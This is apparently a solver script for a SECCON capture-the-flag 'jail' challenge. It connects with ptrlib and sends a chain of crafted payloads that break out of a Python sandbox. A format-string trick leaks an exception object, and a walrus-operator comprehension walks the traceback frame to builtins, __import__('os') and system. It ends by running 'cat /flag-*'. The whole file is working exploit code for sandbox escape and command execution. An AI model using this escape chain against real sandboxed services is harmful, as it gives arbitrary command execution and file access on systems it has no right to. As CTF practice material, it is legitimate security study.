import ptrlib
import os

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 5000)),
)
io.debug = True

io.sendlineafter(
    "jail> ",
    r"""
    "{0\x2e__class__\x2e__base__\x2e__getattribute__\x2ex}".format([])
    """.strip(),
)

# ex.__traceback__.tb_frame.f_builtins["__import__"]("os").system("cat /f*")

io.sendlineafter(
    "jail> ",
    """
    [f := ex.obj] and
    [o := ex] and
    [
        [
            [[k := "__traceback__"] and [g := f]] if i == 0 else
            [[k := "tb_frame"] and [g := f]] if i == 1 else
            [[k := "f_builtins"] and [g := f]] if i == 2 else
            [[g := o["__import__"]] and [o := "os"]] if i == 3 else
            [[k := "system"] and [g := f]] if i == 4 else
            [[k := "x"] and [g := f]]
        ] and [o := g(o, k)]
        for i in {0} | {1} | {2} | {3} | {4} | {5}
    ]
    """.strip().replace(
        "\n", " "
    ),
)

io.sendlineafter(
    "jail> ",
    """
    ex.obj("cat /flag-*")
    """.strip(),
)

print(io.recvline().decode().strip())
